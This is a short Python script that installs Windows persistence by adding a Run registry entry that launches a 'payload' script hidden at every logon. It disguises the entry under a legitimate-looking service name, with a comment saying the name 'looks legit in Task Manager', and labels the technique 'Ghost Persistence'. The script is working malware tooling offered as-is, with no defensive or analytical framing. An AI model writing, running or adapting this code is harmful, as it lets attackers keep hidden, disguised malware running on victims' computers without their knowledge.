import winreg
import os
import sys

# CONFIGURATION
APP_NAME = "AntigravityCoreService" # Name looks legit in Task Manager
PAYLOAD_PATH = r"c:\dLNk\dlnk_launcher.py" 
# Note: In a real scenario, we'd use pythonw.exe to hide the window
PYTHON_EXEC = sys.executable.replace("python.exe", "pythonw.exe")

def install_registry_persistence():
    print(f"[*] Installing Ghost Persistence via Registry...")
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        # Open the Registry Key (HKCU - Current User)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        # Command: pythonw.exe c:\dLNk\dlnk_launcher.py --hidden
        command = f'"{PYTHON_EXEC}" "{PAYLOAD_PATH}" --hidden'
        
        # Set the value
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        
        print(f"[+] Persistence Installed Successfully!")
        print(f"    Key: HKCU\\{key_path}")
        print(f"    Name: {APP_NAME}")
        print(f"    Command: {command}")
        
    except Exception as e:
        print(f"[!] Registry Error: {e}")

if __name__ == "__main__":
    if not os.path.exists(PAYLOAD_PATH):
        print(f"[!] Warning: Payload not found at {PAYLOAD_PATH}")
    
    install_registry_persistence()
